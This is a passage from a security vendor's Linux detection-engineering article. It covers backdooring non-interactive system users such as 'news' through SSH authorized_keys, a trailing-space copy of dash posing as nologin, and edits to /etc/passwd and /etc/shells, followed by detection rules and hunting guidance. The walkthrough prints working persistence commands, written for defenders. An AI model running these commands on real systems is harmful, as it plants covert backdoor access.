<p>Although system users are intended to be non-interactive, attackers can exploit their configurations by creating <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ssh</code> directories in their home directories and adding <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> files for SSH-based authentication. By manipulating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> file and shell configuration, attackers can bypass restrictions imposed by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin</code> and gain access. The next section will explore this technique in detail, including the steps attackers use to execute it.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1098004----ssh-authorized-keys-backdoored-system-users" class="absolute -top-32"></span>Persistence through T1098.004 -  SSH Authorized Keys: Backdoored System Users</h4>
<p>Let’s examine how the PANIX <a href="https://github.com/Aegrah/PANIX/blob/7d5bb3892a79fd23d485c3ed82b8fefc81f178e0/modules/setup_backdoor_system_user.sh">setup_backdoor_system_user.sh</a> module abuses this trick to leverage non-interactive system accounts to gain SSH access onto a target without creating a new user. Refer to the module to inspect the full payloads.</p>
<p>The first step is to identify a system user as the target for the attack. For example, as we know:</p>
<ul>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code> user has <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/news/</code> as its home directory.</li>
<li>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nobody</code> user has <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/nonexistent/</code> by default (which can be created).</li>
</ul>
<p>The next step is to create the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ssh</code> directory within the home directory and writes the attacker’s public key to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> file, and ensure the correct file permissions:</p>
<pre><code># Create the .ssh directory
mkdir -p &quot;$home_dir/.ssh&quot;
chmod 755 &quot;$home_dir/.ssh&quot;  # Set directory permissions to be accessible by others

# Write the public key to authorized_keys
echo &quot;$key&quot; &gt; &quot;$home_dir/.ssh/authorized_keys&quot;
chmod 644 &quot;$home_dir/.ssh/authorized_keys&quot;  # Set file permissions to be readable by others</code></pre>
<p>This step ensures that the attacker can authenticate via SSH using their private key. The next step is to modify the shell. By default, system users like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nobody</code> are configured with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin</code> as their shell, which prevents interactive login sessions. We need to circumvent this restriction by:</p>
<ol>
<li>Copying (for example) <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/dash</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin</code> (with a trailing space).</li>
<li>Updating <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> to include the modified shell path.</li>
</ol>
<pre><code># Copy /bin/dash to &#x27;/usr/sbin/nologin &#x27;
cp /bin/dash &quot;/usr/sbin/nologin &quot;

# Modify /etc/passwd to include the trailing space in the shell path
local username=$(echo &quot;$user_entry&quot; | cut -d: -f1)
sed -i &quot;/^$username:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |&quot; /etc/passwd</code></pre>
<p>Where the local username variable can be set to any system user. This subtle manipulation tricks the system into treating <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin </code>(with a trailing space) as a valid shell.</p>
<p>Finally, to ensure SSH accepts the modified shell as valid, we need to add <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nologin </code>(with a trailing space) to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shells</code>:</p>
<pre><code># Check and add &quot;nologin &quot; to /etc/shells if not already present
if ! grep -q &quot;nologin &quot; /etc/shells; then
    echo &quot;nologin &quot; &gt;&gt; /etc/shells
    echo &quot;[+] Added &#x27;nologin &#x27; to /etc/shells&quot;
else
    echo &quot;[+] &#x27;nologin &#x27; already exists in /etc/shells. Skipping.&quot;
fi</code></pre>
<p>This step ensures SSH does not reject login attempts due to the manipulated shell. Now that we understand the flow, let’s run the module.</p>
<pre><code>&gt; sudo ./panix.sh --backdoor-system-user --default --key &lt;ssh-rsa public key&gt;

[+] Added &#x27;nologin &#x27; to /etc/shells
[+] Copied /bin/dash to &#x27;/usr/sbin/nologin &#x27;
[+] Modified /etc/passwd to update shell path for user: news
[+] System user backdoor persistence established for user: news</code></pre>
<p>After which we can log in to the system via SSH with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code> user:</p>
<pre><code>&gt; ssh news@192.168.31.129
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-130-generic x86_64)</code></pre>
<p>And analyze this technique’s traces in Discover:</p>
<p></p>
<p>Upon PANIX execution, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/news/.ssh/</code> directory and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> files are created and granted the correct permissions (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">755</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">644</code> respectively). Next, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/nologin</code>  (with trailing space) file is created, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shells</code> files are modified. Upon completion, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code> user is able to authenticate via SSH, with an interactive shell.</p>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; sudo ./panix.sh --revert backdoor-system-user

###### [+] Reverting backdoor-system-user module... #####

[+] Removing .ssh directory for user: news
[+] Successfully removed .ssh directory for news.
[+] Reverting /etc/passwd entry for user: news
[+] Successfully reverted /etc/passwd entry for news.

[+] Removing &#x27;/usr/sbin/nologin &#x27;
[+] Successfully removed &#x27;/usr/sbin/nologin &#x27;.
[+] Reverting /etc/shells to remove &#x27;nologin &#x27; entry.
[+] Successfully removed &#x27;nologin &#x27; from /etc/shells.</code></pre>
<p>After which all artifacts should be cleaned.</p>
<p>There are several detection- and endpoint rules set up to detect different parts of this technique:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>IAM</td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_ssh_via_backdoored_system_user.toml">Login via Unusual System User</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_interactive_shell_from_system_user.toml">Unusual Interactive Shell Launched from System User</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/defense_evasion_potential_nologin_ssh_backdoor.toml">Potential Nologin SSH Backdoor</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/cross-platform/defense_evasion_masquerading_space_after_filename.toml">Masquerading Space After Filename</a></td></tr><tr><td><em>Detection and endpoint rules that cover backdoored system user persistence</em></td><td></td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="hunting-for-t1098004----ssh-authorized-keys-backdoored-system-users" class="absolute -top-32"></span>Hunting for T1098.004 -  SSH Authorized Keys: Backdoored System Users</h4>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on identifying unauthorized SSH key additions, tampered system files, and unusual activity involving system users such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">news</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nobody</code>. The following key areas are effective for detection:</p>
<ul>
<li><strong>Suspicious SSH Key Modifications</strong>: Monitors for changes to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ssh</code> directories and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> files in unexpected locations, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/news/.ssh/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/nonexistent/.ssh/</code>.</li>
<li><strong>Unusual File Changes</strong>: Identifies modifications to SSH-related files and directories, tracking ownership and access patterns.</li>
<li><strong>Interactive Process Activity</strong>: Detects rare interactive sessions initiated by system accounts that typically lack login access.</li>
<li><strong>System File Tampering</strong>: Flags modifications to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shells</code>, including unusual shell paths or additions of invalid entries like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nologin </code>.</li>
</ul>
<p>By leveraging the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_ssh_configurations_and_keys.md">Persistence via SSH Configurations and/or Keys</a> hunt, analysts can uncover unauthorized persistence mechanisms, investigate potential abuse of system accounts, and respond effectively to these threats.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>In this third chapter of the &quot;Linux Detection Engineering&quot; series, we explored various persistence techniques adversaries might leverage on Linux systems. Starting with dynamic linker hijacking, we demonstrated how manipulation of the dynamic linker through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> can be abused for persistence. We then looked into loadable kernel modules (LKMs), a powerful feature that allows attackers to embed malicious code directly into the kernel, offering deep system control and persistence. We then explored the threat web shells pose, which enable scripting-based persistence and remote access, making them a significant risk in web-exposed environments. Finally, we analyzed the exploitation of default system users with non-interactive shells, revealing how attackers can leverage these often-overlooked accounts to establish persistence without creating new user entries.</p>
<p>These techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. You can build robust defenses and fine-tune your detection strategies by leveraging <a href="https://github.com/Aegrah/PANIX">PANIX</a> to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided.</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/continuation-on-persistence-mechanisms#introduction"><span>Introduction</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/continuation-on-persistence-mechanisms#setup-note"><span>Setup&nbsp;note</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/continuation-on-persistence-mechanisms#t1574006---hijack-execution-flow-dynamic-linker-hijacking"><span>T1574.006 -&nbsp; Hijack Execution Flow: Dynamic Linker&nbsp;Hijacking</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/continuation-on-persistence-mechanisms#t1574006---dynamic-linker-hijacking-ld_preload"><span>T1574.006 -&nbsp; Dynamic Linker Hijacking:&nbsp;LD_PRELOAD</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/continuation-on-persistence-mechanisms#persistence-through-t1574006---dynamic-linker-hijacking-ld_preload"><span>Persistence through T1574.006 -&nbsp; Dynamic Linker Hijacking:&nbsp;LD_PRELOAD</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/continuation-on-persistence-mechanisms#hunting-for-t1574006---dynamic-linker-hijacking-ld_preload-"><span>Hunting for T1574.006 -&nbsp; Dynamic Linker Hijacking: LD_PRELOAD&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/continuation-on-persistence-mechanisms#t1547006---boot-or-logon-autostart-execution-kernel-modules-and-extensions"><span>T1547.006 -&nbsp; Boot or Logon Autostart Execution: Kernel Modules and&nbsp;Extensions</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/continuation-on-persistence-mechanisms#t1014---rootkit"><span>T1014 -&nbsp;&nbsp;Rootkit</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/continuation-on-persistence-mechanisms#future-work-t1014---rootkit"><span>Future Work: T1014 -&nbsp;&nbsp;Rootkit</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/continuation-on-persistence-mechanisms#persistence-through-t1547006---kernel-modules-and-extensions"><span>Persistence through T1547.006 -&nbsp; Kernel Modules and&nbsp;Extensions</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Linux Detection Engineering - A Continuation on Persistence Mechanisms&amp;url=https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms&amp;title=Linux Detection Engineering - A Continuation on Persistence Mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms&amp;title=Linux Detection Engineering - A Continuation on Persistence Mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Linux Detection Engineering - A Continuation on Persistence Mechanisms","slug":"continuation-on-persistence-mechanisms","date":"2025-01-27","description":"This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments.","image":"continuation-on-persistence-mechanisms.jpg","subtitle":"Enhancing Linux detection engineering with lessons learned and refined practices for persistence monitoring.","tags":["linux","persistence"],"body":{"raw":"\n## Introduction\n\nWelcome to part three of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some additional, creative and/or complex persistence mechanisms.\n\nIf you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:\n\n* [Linux Detection Engineering - A Primer on Persistence Mechanisms](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)\n* [Linux Detection Engineering - A Sequel on Persistence Mechanisms](https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms)\n\nIn this publication, we’ll provide insights into:\n\n* How each works (theory)\n* How to set each up (practice)\n* How to detect them (SIEM and Endpoint rules)\n* How to hunt for them (ES|QL and OSQuery reference hunts)\n\nTo make the process even more engaging, we will be leveraging [PANIX](https://github.com/Aegrah/PANIX), a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.\n\nBy the end of this series, you'll have a robust knowledge of common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Are you ready to continue the journey on Linux persistence mechanisms? Let’s dive in!\n\n## Setup note\n\nTo ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to [enable and update our pre-built detection rules](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.\n\n## T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking\n\nThe [dynamic linker](https://man7.org/linux/man-pages/man8/ld.so.8.html) is a critical component of the Linux operating system responsible for loading and linking shared libraries required by dynamically linked executables. When a program is executed, the dynamic linker resolves references to shared libraries, loading them into memory and linking them to the application at runtime. This allows programs to use external libraries, such as the GNU C Library (`glibc`), without including the library code within the program itself, which saves memory and simplifies updates.\n\nSeveral key files and paths that play a crucial role in dynamic linking libraries are the following:\n\n* Dynamic linker binaries (e.g. `ld-linux-x86-64.so.2`):\n    * Typically located in `/lib/`  or `/usr/lib/` for 32-bit systems.\n    * Found in `/lib64/` or `/usr/lib64/` on 64-bit systems.\n* Symbolic links to dynamic linker binaries:\n    * Typically found in `/lib/x86_64-linux-gnu/` or `/usr/lib/x86_64-linux-gnu/` for 64-bit systems.\n    * Typically found in `/lib/i386-linux-gnu/` and `/usr/lib/i386-linux-gnu/` on 32-bit systems.\n* Configuration files:\n    * `/etc/ld.so.conf`: Specifies additional library paths for the dynamic linker.\n    * `/etc/ld.so.cache`: A precompiled cache of library locations generated by `ldconfig` for efficient resolution.\n    * `/etc/ld.so.preload`: Specifies libraries to load before any other libraries.\n\nYou can observe the dynamic linker in action using the `ldd` command, which lists the shared libraries required by an executable and their resolved paths. For example:\n\n```python\n\u003e ldd /bin/ls\n\nlinux-vdso.so.1 (0x00007fff87480000)\nlibc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f235ff29000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)\n```\n\nThis output shows the libraries needed by the `ls` command, along with their locations and the dynamic linker binary responsible for loading them. The dynamic linker itself appears as `/lib64/ld-linux-x86-64.so.2` in this case.\n\nWhen a dynamically 